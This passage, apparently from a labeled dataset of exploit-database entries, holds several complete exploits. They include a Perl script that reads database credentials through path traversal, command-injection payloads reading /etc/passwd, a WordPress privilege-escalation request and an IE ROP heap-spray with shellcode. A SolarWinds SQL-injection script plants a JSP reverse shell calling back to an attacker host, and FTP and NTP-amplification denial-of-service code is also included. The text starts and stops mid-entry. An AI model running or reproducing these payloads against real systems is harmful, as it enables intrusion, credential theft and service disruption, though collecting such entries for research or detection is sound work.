Cookie: "".$cookie.""\n""; if ($cookie eq """") {         print ""[-] Failed to login. Exiting...""; 	exit(); }  print ""[+] Sending request\n"";  $xpack = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => $target, PeerPort => $port) || die ""[-] Failed to connect on exploit attempt. Exiting...\r\n""; print $xpack ""GET "".$folder.""downloaddetails.php?alias=../../config.php HTTP/1.1\n""; print $xpack ""Host: $target\n""; print $xpack ""User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n""; print $xpack ""Accept: text/html\n""; print $xpack ""Cookie: "".$cookie.""\n""; print $xpack ""Connection: keep-alive\n\n""; print ""\n---------- Exploit Results ----------\n\n"";   while (<$xpack>) { 	if (/db_type""] = ""(.*?)"";/) { 		print ""Type: $1\n""; } 	if (/db_host""] = ""(.*?)"";/) { 		print ""Host: $1\n""; } 	if (/db_name""] = ""(.*?)"";/) { 		print ""Name: $1\n""; } 	if (/db_user""] = ""(.*?)"";/) { 		print ""User: $1\n""; } 	if (/db_pass""] = ""(.*?)"";/) { 		print ""Pass: $1\n\n"";  		$res = true; } } if ($res eq false) { 	print ""[-] Exploit failed - Not vulnerable\n""; }  print ""[!] Connection to host lost...\n"";  ################################################################################################# #               This has been another r0ut3r discovery - writ3r [at] gmail.com                  # #################################################################################################  # milw0rm.com [2006-12-09]",local,webapps,0
41040,"Zeroshell 3.6.0/3.7.0 Net Services - Remote Code Execution #################################################################################################################################### # Exploit Title: Zeroshell - Net Services  Unauthenticated Remote Code Execution | RCE # Date: 13.01.2017 # Exploit Author: Ozer Goker # Vendor Homepage: http://www.zeroshell.org # Software Link: www.zeroshell.org/download/ # Version: 3.6.0 & 3.7.0 ####################################################################################################################################  Introduction  Zeroshell is a small Linux distribution for servers and embedded devices with the aim to provide network services. It is available in the form of live CD or compact Flash image and it can be configured using a web browser. The main features of Zeroshell include: load balancing and failover of multiple Internet connections, UMTS/HSDPA connections by using 3G modems, RADIUS server for providing secure authentication and automatic management of encryption keys to wireless networks, captive portal to support web login, and many others.   Vulnerabilities: Unauthenticated Remote Code Execution | RCE   RCE details:  ####################################################################################################################################  RCE 1  URL http://192.168.0.75/cgi-bin/kerbynet?Action=StartSessionSubmit&User=%27%26cat%20/etc/passwd%26%27&PW=  METHOD Get,Post  PARAMETER User  PAYLOAD %27%26cat%20/etc/passwd%26%27   ####################################################################################################################################  RCE 2  URL http://192.168.0.75/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%26cat%20/etc/passwd%26%27  METHOD Get  PARAMETER x509type  PAYLOAD %27%26cat%20/etc/passwd%26%27   ####################################################################################################################################  RCE 3  URL http://192.168.0.75/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=%22%26cat%20/etc/passwd%26%22  METHOD Get  PARAMETER type  PAYLOAD %22%26cat%20/etc/passwd%26%22   ####################################################################################################################################",remote,webapps,1
39411,"WordPress Plugin User Meta Manager 3.4.6 - Privilege Escalation * Exploit Title: WordPress User Meta Manager Plugin [Privilege Escalation] * Discovery Date: 2015/12/28 * Public Disclosure Date: 2016/02/04 * Exploit Author: Panagiotis Vagenas * Contact: https://twitter.com/panVagenas * Vendor Homepage: http://jasonlau.biz/home/ * Software Link: https://wordpress.org/plugins/user-meta-manager/ * Version: 3.4.6 * Tested on: WordPress 4.4.1 * Category: webapps  Description ================================================================================  User Meta Manager for WordPress plugin up to v3.4.6 suffers from a privilege  escalation vulnerability. A registered user can modify the meta information of  any registered user, including himself. This way he can modify `wp_capabilities` meta to escalate his account to a full privileged administrative account.  PoC ================================================================================   curl -c ${USER_COOKIES} \      -d ""mode=edit&umm_meta_value[]=a:1:{s:13:\""administrator\"";b:1;}\      &umm_meta_key[]=wp_capabilities"" \     ""http://${VULN_SITE}/wp-admin/admin-ajax.php\?action=umm_switch_action\     &umm_sub_action=umm_update_user_meta&umm_user=${USER_ID}""   Timeline ================================================================================  2015/12/28 - Discovered 2015/12/29 - Vendor notified via support forums in WordPress.org 2015/12/29 - Vendor notified via contact form in his site 2016/01/29 - WordPress security team notified about the issue 2016/02/02 - Vendor released version 3.4.7 2016/02/02 - Verified that this exploit no longer applies in version 3.4.7  Solution ================================================================================    No official solution yet exists.",remote,webapps,1
33756,"Joomla! Component com_seek - 'id' SQL Injection source: https://www.securityfocus.com/bid/38711/info  The 'com_seek' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_seek&task=list1&id=-1+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",remote,webapps,1
41425,"EasyCom For PHP 4.0.0 - Buffer Overflow (PoC) [+] Credits: John Page AKA Hyp3rlinX [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/EASYCOM-PHP-API-BUFFER-OVERFLOW.txt [+] ISR: ApparitionSec                Vendor: ================ easycom-aura.com    Product: =========================== EASYCOM AS400 (iBMI) PHP API  EasycomPHP_4.0029.iC8im2.exe  EASYCOM is the middleware which provides native access to IBMi data and programs. With its excellent performance and strict compliance with IBMi security regulations, this technology facilitates development of Internet, mobile and client/server applications in Windows, Linux, and IBMi.   EasyCom tested here requires older version of PHP.  Setup test environment:  Windows 7 XAMPP 1.7.3 PHP 5.3.1 (cli) (built: Nov 20 2009 17:26:32) Copyright (c) 1997-2009 The PHP Group Zend Engine v2.3.0  PHP compiled module API=20090626 (need to use for EasyCom IBM DLL)   Vulnerability Type: ========================= API Stack Buffer Overflow    CVE Reference: ============== CVE-2017-5358    Security Issue: ================ EasyCom PHP API suffers from multiple Buffer Overflow entry points, which can result in arbitrary code execution on affected system. Below I provide some proof of concept details for a few of them.   EAX 00000000 ECX 41414141 EDX 771D6ACD ntdll.771D6ACD EBX 00000000 ESP 00C0F238 EBP 00C0F258 ESI 00000000 EDI 00000000 EIP 41414141  C 0  ES 002B 32bit 0(FFFFFFFF) P 1  CS 0023 32bit 0(FFFFFFFF) A 0  SS 002B 32bit 0(FFFFFFFF) Z 1  DS 002B 32bit 0(FFFFFFFF) S 0  FS 0053 32bit 7EFDD000(FFF) T 0  GS 002B 32bit 0(FFFFFFFF) D 0 O 0  LastErr ERROR_SUCCESS (00000000) EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)   SEH chain of main thread Address    SE handler 00C0F354   kernel32.7600410E 00C0FF78   42424242 52525252   *** CORRUPT ENTRY ***  WinDbg dump...  (720.a70): Access violation - code c0000005 (first/second chance not available) *** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll -  eax=00000000 ebx=00000000 ecx=41414141 edx=77316acd esi=00000000 edi=00000000 eip=41414141 esp=004111e8 ebp=00411208 iopl=0         nv up ei pl zr na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246 41414141 ??              ??? 0:000> !load winext/msec 0:000> !exploitable  !exploitable 1.6.0.0 Exploitability Classification: EXPLOITABLE Recommended Bug Title: Exploitable - Data Execution Prevention Violation starting at Unknown Symbol @ 0x0000000041414141 called from ntdll!RtlDosSearchPath_Ustr+0x0000000000000ada (Hash=0x05cdf8a7.0xce7d7411)  User mode DEP access violations are exploitable.   PHP Crash: =============  Problem signature:   Problem Event Name:	BEX   Application Name:	php.exe   Application Version:	5.3.1.0   Application Timestamp:	4b06c430   Fault Module Name:	StackHash_e98d   Fault Module Version:	0.0.0.0   Fault Module Timestamp:	00000000   Exception Offset:	41414141   Exception Code:	c0000005   Exception Data:	00000008   OS Version:	6.1.7601.2.1.0.256.48    Exploit/POC: =============== php_Easycom5_3_0.dll 0day vuln POC minus the exploit, I'm bored goin to the park.  <?php  /* Basic connection to an AS400 iBMI System  */  $payload=str_repeat(""A"", 4000);                                          #BOOM! $payload=str_repeat(""A"",1868).""RRRRBBBB"".str_repeat(""\x90"",100);         #SEH  $conn = i5_connect($payload, ""QPGMR"", ""PASSW"") or die(i5_errormsg());    #VULN  $conn = i5_pconnect($payload, 'QSECOFR', 'password', array() );          #VULN  $conn = i5_private_connect($payload, $user, $password, array());         #VULN   echo 'EasyCom PHP API 0day ' . $conn;  ?>    Network Access: =============== Remote    Severity: ========== High    Disclosure Timeline: ====================================== Vendor Notification: December 22, 2016 Vendor acknowledgement: December 23, 2016 Vendor Release Fix/Version February 20, 2017 February 22, 2017 : Public Disclosure     [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.",remote,dos,1
21157,"bharat Mediratta Gallery 1.1/1.2 - Directory Traversal source: https://www.securityfocus.com/bid/3554/info  Bharat Mediratta Gallery is a free, open source web-based photo album which may be used as an add-on for the PHPNuke web portal.  Due to insufficient validation of user-supplied input, it is be possible to view arbitrary web-readable files via a specially crafted web request which contains '../' sequences.  This issue may allow a remote attacker to gather sensitive information which may be used in directed and organized attacks against a host running the Gallery software.  http://www.somehost.com/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/hosts",remote,webapps,1
35044,Alguest 1.1 - Multiple Cookie Authentication Bypass Vulnerabilities source: https://www.securityfocus.com/bid/45175/info  Alguest is prone to multiple authentication-bypass vulnerabilities.  Attackers can exploit this issue to gain administrative control of the affected application.  Alguest 1.1c-patched is vulnerable; other versions may also be affected.   The following example input is available:  Cookie: admin=anyvalue,remote,webapps,1
25835,"Logic Print 2013 - vTable Overwrite Stack Overflow <!--  Exploit Title: Logic Print 2013 stack overflow (vTable overwrite) Software Link: http://www.logic-print.com/ Tested on: Win XP SP3 French + Internet Explorer 8 Date: 29/05/2013 Author: h1ch4m (Hicham Oumounid) Email: h1ch4m@live.fr Twitter: @o_h1ch4m  Thanks to corelanc0d3r for: ""DEPS"" - Precise heap spray for FF/IE8/IE9/IE10  Well, the bug isn't in the app itself, but in a third party dll ""PDF In-The-Box"" from http://www.synactis.com Logic Print 2013 uses an old version of the dll, new ones aren't affected, the ROP is from an os dll: [msi.dll] (C:\WINDOWS\system32\msi.dll) 3.1.4001.5512   --> <html> <head> <OBJECT classid=""clsid:C80CAF1F-C58E-11D5-A093-006097ED77E6"" id=""xploit""></OBJECT> </head> <body OnLoad=""xploit();""> <div id=""blah""></div> <script language=""javascript"">     var rop = """"; 	var shellcode = """"; 	var junk1 = ''; 	var junk2 = ''; 	 	     function theMagicalMysteryTour() 	{ 	    rop = unescape(""%u2230%u2030"" + 		               ///////////////////////////////////////////// 					   ///              STACK PIVOT              /// 					   ///////////////////////////////////////////// 		               ""%u370d%u7d20"" +  // 0x7d20370d : # XCHG EAX,ESP # ADD DWORD PTR DS:[EAX],EAX # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN 0x04    ** [msi.dll] **   |  ascii 					   ""%u4141%u4141"" + 					   ""%u0116%u7d2e"" +  // 0x7d2e0116 :  # RETN    ** [msi.dll] **   |  ascii 					   ""%u4141%u4141"" + 					    					   ///////////////////////////////////////////// 					   /// ECX = lpOldProtect (ptr to W address) /// 					   ///////////////////////////////////////////// 					   ""%u1815%u7d21"" +  // 0x7d211815 :  # POP ECX # RETN [msi.dll]  					   ""%u4070%u7D3B"" +  // 0x7D3B4070 :  # &Writable location [msi.dll] 					   ///////////////////////////////////////////// 					   ///          EDX = NewProtect (0x40)      /// 					   ///////////////////////////////////////////// 					   ""%u9c86%u7d27"" +  // 0x7d279c86 :  # POP EAX # RETN    ** [msi.dll] 					   ""%uFFC0%uFFFF"" +  // 0xFFFFFFBF 					   ""%u66d7%u7d2e"" +  // 0x7d2e66d7 :  # NEG EAX # RETN 0x04    ** [msi.dll] 					   ""%u23dc%u7d20"" +  // 0x7d2023dc :  # XCHG EAX,EDX # RETN    ** [msi.dll] 					   ""%u4141%u4141"" + 					   ///////////////////////////////////////////// 					   ///               EBX = dwSize            /// 					   ///////////////////////////////////////////// 					   ""%u9c86%u7d27"" +  // 0x7d279c86 :  # POP EAX # RETN    ** [msi.dll] 					   ""%uFAFF%uFFFF"" +  // 0xFFFFFAFF 					   ""%u66d7%u7d2e"" +  // 0x7d2e66d7 :  # NEG EAX # RETN 0x04    ** [msi.dll] 					   ""%u29ac%u7d24"" +  // 0x7d2429ac :  # XCHG EAX,EBX # OR EAX,14C48300 # POP EBP # RETN 0x08    ** [msi.dll] 					   ""%u4141%u4141"" + 					   ""%u4141%u4141"" + 					   ""%u0116%u7d2e"" +  // 0x7d2e0116 :  # RETN    ** [msi.dll] **   |  ascii 					   ""%u4141%u4141"" + 					   ""%u4141%u4141"" + 					   ///////////////////////////////////////////// 					   ///     ESI = ptr to VirtualProtect()     /// 					   ///     EBP = ReturnTo (ptr to jmp esp)   /// 					   ///////////////////////////////////////////// 					   ""%u9c86%u7d27"" +  // 0x7d279c86 :  # POP EAX # RETN    ** [msi.dll] 					   ""%u1318%u6358"" +  // 0x63581318 :  # ptr to VirtualProtect() [mshtml.dll] 					   ""%uf84a%u7d3a"" +  // 0x7d3af84a :  # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [msi.dll] 					   ""%u0622%u7d36"" +  // 0x7d360622 :  # PUSH EAX # POP ESI # POP EBP # RETN 0x04    ** [msi.dll] 					   ""%ub275%u7d24"" +  // 0x7d24b275 :  # jmp esp 					   ///////////////////////////////////////////// 					   ///         EDI = ROP NOP (RETN)          /// 					   ///////////////////////////////////////////// 					   ""%u2669%u7d20"" +  // 0x7d202669 :  # POP EDI # RETN    ** [msi.dll] 					   ""%u4141%u4141"" + 					   ""%u0116%u7d2e"" +  // 0x7d2e0116 :  # RETN    ** [msi.dll] **   |  ascii 					   ///////////////////////////////////////////// 					   ///       EAX = NOP (0x90909090)          /// 					   ///////////////////////////////////////////// 					   ""%u9c86%u7d27"" +  // 0x7d279c86 :  # POP EAX # RETN    ** [msi.dll] 					   ""%u9090%u9090"" + 					   ///////////////////////////////////////////// 					   ///           PUSH IT & GET IT            /// 					   ///////////////////////////////////////////// 					   ""%uc08e%u7d27"" +  // 0x7d27c08e :  # PUSHAD # RETN    ** [msi.dll] 					   """"); 		 		// win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 		shellcode = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949"" +                           ""%u4948%u4949%u4949%u4949%u4949%u4949%u5a51%u436a"" +                           ""%u3058%u3142%u4250%u6b41%u4142%u4253%u4232%u3241"" +                           ""%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u4d4c"" +                           ""%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c"" +                           ""%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f"" +                           ""%u6e68%u736b%u716f%u6530%u6a51%u724b%u4e69%u366b"" +                           ""%u4e54%u456b%u4a51%u464e%u6b51%u4f70%u4c69%u6e6c"" +                           ""%u5964%u7350%u5344%u5837%u7a41%u546a%u334d%u7831"" +                           ""%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955"" +                           ""%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b"" +                           ""%u726c%u4c6b%u534b%u376f%u636c%u6a31%u4e4b%u756b"" +                           ""%u6c4c%u544b%u4841%u4d6b%u5159%u514c%u3434%u4a44"" +                           ""%u3063%u6f31%u6230%u4e44%u716b%u5450%u4b70%u6b35"" +                           ""%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530"" +                           ""%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b"" +                           ""%u6c30%u5770%u5770%u4770%u4c70%u704b%u4768%u714c"" +                           ""%u444f%u6b71%u3346%u6650%u4f36%u4c79%u6e38%u4f63"" +                           ""%u7130%u306b%u4150%u5878%u6c70%u534a%u5134%u334f"" +                           ""%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377"" +                           ""%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f"" +                           ""%u4147%u4163%u504c%u4273%u3159%u5063%u6574%u7035"" +                           ""%u546d%u6573%u3362%u306c%u4163%u7071%u536c%u6653"" +                           ""%u314e%u7475%u7038%u7765%u4370""); 	} 	     function DEPS()     { 	    var div_container = document.getElementById(""blah""); 	    div_container.style.cssText = ""display:none""; 	    var data; 	    offset = 0x104; 	    junk = unescape(""%u2020%u2020""); 	    while (junk.length < 0x1000) junk += junk; 	     	    data = junk.substring(0,offset) + rop + shellcode 	    data += junk.substring(0,0x800-offset-rop.length-shellcode.length);  	    while (data.length < 0x80000) data += data; 	 	    for (var i = 0; i < 0x450; i++)  	    { 			var obj = document.createElement(""button""); 		    obj.title = data.substring(0,0x40000-0x58); 		    div_container.appendChild(obj); 	    } 	} 	 	function xploit() 	{ 	    theMagicalMysteryTour(); 		DEPS(); 		 		// MOV EAX,DWORD PTR SS:[EBP-10];    the stack is overflowed, ebp-10 is put in eax then >>>>|| 		// MOV ECX,DWORD PTR DS:[EAX];                                                              || 		// CALL DWORD PTR DS:[ECX-4];         BOOOOOOOOOOOM                                     <<<<|| 	     		EAX = ""\x28\x22\x30\x20"";  // 0x20302228  heap adress "" Corelan ""DEPS"" - Precise heap spray "" 		 		while (junk1.length < 189) junk1 += ""\x41""; 		while (junk2.length < 7000) junk2 += ""\x41""; 		 		var xploit = document.getElementById(""xploit""); 		xploit.ConnectToSynactis(junk1+EAX+junk2); 	} 	 </script> </body> </html>",remote,remote,1
18818,"SolarWinds Storage Manager 5.1.0 - Remote SYSTEM SQL Injection #!/usr/bin/python ###################################################################################### # Exploit Title: Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit # Date: May 2nd 2012 # Author: muts # Version: SolarWinds Storage Manager 5.1.0 # Tested on: Windows 2003 # Archive Url : http://www.offensive-security.com/0day/solarshell.txt ###################################################################################### # Discovered by Digital Defence - DDIVRT-2011-39 ######################################################################################   import urllib, urllib2, cookielib import sys import random  print ""\n[*] Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit"" print ""[*] Vulnerability discovered by Digital Defence - DDIVRT-2011-39""  print ""[*] Offensive Security - http://www.offensive-security.com\n"" if (len(sys.argv) != 4): 	print ""[*] Usage: solarshell.py <RHOST> <LHOST> <LPORT>"" 	exit(0)  rhost = sys.argv[1] lhost = sys.argv[2] lport = sys.argv[3]  filename = '' for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6): 	filename+=i filename +="".jsp""  output_path= ""c:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s"" %filename  jsp = '''<%@page import=""java.lang.*""%> <%@page import=""java.util.*""%> <%@page import=""java.io.*""%> <%@page import=""java.net.*""%>  <% 	class StreamConnector extends Thread 	{ 		InputStream is; 		OutputStream os;  		StreamConnector( InputStream is, OutputStream os ) 		{ 		this.is = is; 		this.os = os; 		}  		public void run() 		{ 		BufferedReader in  = null; 		BufferedWriter out = null; try { 	in  = new BufferedReader( new InputStreamReader( this.is ) ); 	out = new BufferedWriter( new OutputStreamWriter( this.os ) ); 	char buffer[] = new char[8192]; 	int length; 	while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) 	{ 		out.write( buffer, 0, length ); 		out.flush(); 	} } catch( Exception e ){} try { 	if( in != null ) 		in.close(); 	if( out != null ) 		out.close(); } catch( Exception e ){} 		} 	}  	try 	{ 		Socket socket = new Socket( ""''' + lhost +'''"", '''+lport+'''); 		Process process = Runtime.getRuntime().exec( ""cmd.exe"" ); 		( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); 		( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); 	} catch( Exception e ) {} %>'''  jsp = jsp.replace(""\n"","""") jsp = jsp.replace(""\t"","""")  prepayload = ""AAA' "" prepayload += 'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile ""%s""' % (jsp.encode('hex'),output_path) prepayload += ""#"" postpayload = ""1' or 1=1#--"" loginstate='checkLogin' password = 'OHAI'  cj = cookielib.CookieJar() opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : prepayload,'password' : password}) print ""[*] Sending evil payload"" resp = opener.open(""http://%s:9000/LoginServlet"" %rhost, post_params) print ""[*] Triggering shell"" post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : postpayload,'password' : password}) resp = opener.open(""http://%s:9000/LoginServlet"" % rhost, post_params) resp = opener.open(""http://%s:9000/%s""  % (rhost,filename)) print ""[*] Check your shell on %s %s\n"" % (lhost,lport)  # 01010011 01101100 01100101 01100101 01110000 01101001 01110011 01101111  # 01110110 01100101 01110010 01110010 01100001 01110100 01100101 01100100",remote,remote,1
44221,"SEGGER embOS/IP FTP Server 3.22 - Denial of Service [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/SEGGER-embOS-FTP-SERVER-v3.22-FTP-COMMANDS-DENIAL-OF-SERVICE.txt [+] ISR: Apparition Security               Vendor: ============= www.segger.com   Product: =========== embOS/IP FTP Server v3.22   Vulnerability Type: =================== FTP Commands Denial Of Service    CVE Reference: ============== CVE-2018-7449   Security Issue: ================ SEGGER embOS/IP FTP Server 3.22 allows remote attackers to cause a denial of service (daemon crash) via an invalid LIST, STOR, or RETR command.  STOR 666\r\n LIST\r\n RETR '+'..\\'*8+'Windows\system.ini\r\n   TELNET x.x.x.x 21  220 Welcome to embOS/IP FTP server USER anonymous 331 Password required. PASS anonymous 230 User logged in, proceed. STOR Bye!  CRASH!!!    Exploit/POC: ============= import socket,time  VICTIM=raw_input('[+]Segger v3.22 FTP Server IP > ') USR='anonymous' PWD='anonymous' CMD=""STOR Bye!\r\n""  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((VICTIM, 21))  print s.recv(1024) # Recieve FTP Banner time.sleep(1) s.send(""USER "" + USR+ ""\r\n"")  print s.recv(1024)  time.sleep(1) s.send(""PASS ""+ PWD+""\r\n"") # print s.recv(1024)  time.sleep(1) s.send(CMD) print 'Sent %s' % CMD s.close()      Network Access: =============== Remote    Severity: ========= Medium    Disclosure Timeline: ============================= Vendor Notification:  February 17, 2018 Vendor acknowledgement: February 19, 2018 Vendor released fixed version v3.22a : February 23, 2018 March 1, 2018 : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).",remote,dos,1
33073,"NTP ntpd monlist Query Reflection - Denial of Service /*  * Exploit Title: CVE-2013-5211 PoC - NTP DDoS amplification  * Date: 28/04/2014  * Code Author: Danilo PC - <DaNotKnow@gmail.com>  * CVE : CVE-2013-5211 */  /* I coded this program to help other to understand how an DDoS attack amplified by NTP servers works (CVE-2013-5211)  * I took of the code that generates a DDoS, so this code only sends 1 packet. Why? Well...there's a lot of kiddies out there,   *  if you know how to program, making a loop or using with other tool is piece of cake. There core idea is there, just use it as you please.  */  //------------------------------------------------------------------------------------------------// //------------------------------------------------------------------------------------------------//   #include <stdio.h>         //For on printf function #include <string.h>        //For memset #include <sys/socket.h>    //Structs and Functions used for sockets operations. #include <stdlib.h>	   //For exit function #include <netinet/ip.h>    //Structs for IP header  //Struct for UDP Packet struct udpheader{ 	unsigned short int udp_sourcePortNumber; 	unsigned short int udp_destinationPortNumber; 	unsigned short int udp_length; 	unsigned short int udp_checksum; };  // Struct for NTP Request packet. Same as req_pkt from ntpdc.h, just a little simpler struct 	ntpreqheader { 	unsigned char rm_vn_mode;		/* response, more, version, mode */ 	unsigned char auth_seq;		/* key, sequence number */ 	unsigned char implementation;		/* implementation number */ 	unsigned char request;			/* request number */ 	unsigned short err_nitems;		/* error code/number of data items */ 	unsigned short  mbz_itemsize;		/* item size */ 	char data[40];				/* data area [32 prev](176 byte max) */ 	unsigned long tstamp;			/* time stamp, for authentication */ 	unsigned int keyid;			/* encryption key */ 	char mac[8]; 		/* (optional) 8 byte auth code */ };   // Calculates the checksum of the ip header. unsigned short csum(unsigned short *ptr,int nbytes)  {     register long sum;     unsigned short oddbyte;     register short answer;      sum=0;     while(nbytes>1) {         sum+=*ptr++;         nbytes-=2;     }     if(nbytes==1) {         oddbyte=0;         *((u_char*)&oddbyte)=*(u_char*)ptr;         sum+=oddbyte;     }      sum = (sum>>16)+(sum & 0xffff);     sum = sum + (sum>>16);     answer=(short)~sum;     return(answer); }   //Da MAIN  int main(int argc, char **argv) { int status;			// Maintains the return values of the functions struct iphdr *ip;		// Pointer to ip header struct struct udpheader *udp;		// Pointer to udp header struct struct ntpreqheader *ntp;	// Pointer to ntp request header struct int sockfd;			// Maintains the socket file descriptor int one = 1;			// Sets the option IP_HDRINCL of the sockt to tell the kernel that the header are alredy included on the packets. struct sockaddr_in dest;	// Maintains the data of the destination address char packet[ sizeof(struct iphdr) + sizeof(struct udpheader) + sizeof(struct ntpreqheader) ]; //Packet itself  // Parameters check 	if( argc != 3){ 		printf(""Usage: ./ntpDdos [Target IP] [NTP Server IP]\n""); 		printf(""Example: ./ntpDdos 1.2.3.4 127.0.0.1 \n""); 		printf(""Watch it on wireshark!\n""); 		printf(""Coded for education purpose only!\n""); 		exit(1); 	}  // Create a socket and tells the kernel that we want to use udp as layer 4 protocol 	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP); 	if (sockfd == -1){ 		printf(""Error on initializing the socket\n""); 		exit(1); 	}    //Sets the option IP_HDRINCL 	status = setsockopt( sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof one); 	if (status == -1){                 printf(""Error on setting the option HDRINCL on socket\n"");                 exit(1);         }   //""Zeroes"" all the packet stack 	memset( packet, 0, sizeof(packet) );   //Mounts the packet headers // [ [IP HEADER] [UDP HEADER] [NTP HEADER] ] --> Victory!!! 	ip = (struct iphdr *)packet; 	udp = (struct udpheader *) (packet + sizeof(struct iphdr) ); 	ntp = (struct ntpreqheader *) (packet + sizeof(struct iphdr) + sizeof(struct udpheader) );   //Fill the IP Header 	ip->version = 4;		//IPv4         ip->ihl = 5;			//Size of the Ip header, minimum 5         ip->tos = 0;			//Type of service, the default value is 0         ip->tot_len = sizeof(packet);   //Size of the datagram         ip->id = htons(1234);   	//LengthIdentification Number         ip->frag_off = 0;		//Flags, zero represents reserved         ip->ttl = 255;	      		//Time to Live. Maximum of 255         ip->protocol = IPPROTO_UDP;	//Sets the UDP as the next layer protocol         ip->check = 0;	      		//Checksum.         ip->saddr = inet_addr( argv[1] );  //Source ip ( spoofing goes here)         ip->daddr = inet_addr( argv[2] ); //Destination IP  	//Fills the UDP Header 	udp->udp_sourcePortNumber = htons( atoi( ""123"" ) );       //Source Port 	udp->udp_destinationPortNumber = htons(atoi(""123"")) ;   //Destination Port 	udp->udp_length = htons( sizeof(struct udpheader) + sizeof(struct ntpreqheader) ); //Length of the packet 	udp->udp_checksum = 0;				     //Checksum  	//Calculate the checksums 	ip->check = csum((unsigned short *)packet, ip->tot_len);   //Calculate the checksum for iP header  	//Sets the destination data 	dest.sin_family = AF_INET;				 // Address Family Ipv4 	dest.sin_port = htons (atoi( ""123"" ) ) ; 		// Destination port 	dest.sin_addr.s_addr = inet_addr( argv[2] );       // Destination Endereço para onde se quer enviar o pacote   	//Fills the NTP header 	//Ok, here is the magic, we need to send a request ntp packet with the modes and codes sets for only MON_GETLIST 	//To do this we can import the ntp_types.h and use its structures and macros. To simplify i've created a simple version of the  	// ntp request packet and hardcoded the values for the fields to make a ""MON_GETLIST"" request packet.  	// To learn more, read this: http://searchcode.com/codesearch/view/451164#127 	ntp->rm_vn_mode=0x17;       //Sets the response bit to 0, More bit to 0, Version field to 2, Mode field to 7 	ntp->implementation=0x03;   //Sets the implementation to 3 	ntp->request=0x2a;	    //Sets the request field to 42 ( MON_GETLIST ) 				    //All the other fields of the struct are zeroed 	  	// Sends the packets 	status = sendto(sockfd, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest) ); 		if(status <0){ 			printf(""Failed to send the packets\n""); 			exit(1); 		}   }",local,dos,0
901,"PunBB 1.2.2 - Authentication Bypass #!/usr/bin/perl use IO::Socket;  # #   PunBB version <= 1.2.2 auth bypass exploit # # ------------------------------------------------- # About vuln: # lets look file /include/functions.php # ### code start ### # function check_cookie(&$pun_user) # { # ... # if (isset($_COOKIE[$cookie_name])) # list($cookie['user_id'], $cookie['password_hash']) = @unserialize($_COOKIE[$cookie_name]); # # if ($cookie['user_id'] > 1) # { # // Check if there's a user with the user ID and password hash from the cookie # $result = $db->query('SELECT .... tra-la-la... ); # $pun_user = $db->fetch_assoc($result); #  # // If user authorisation failed # if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash']) # ...                                                                    ^^^ HERE !!! # ### code end ### # and we can logging with any user id if we use boolean value in cookie password_hash  # evil cookie is : a:2:{i:0;s:1:""2"";i:1;b:1;} where 2 is user id #  # fix: # if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash']) # change to # if (!isset($pun_user['id']) || 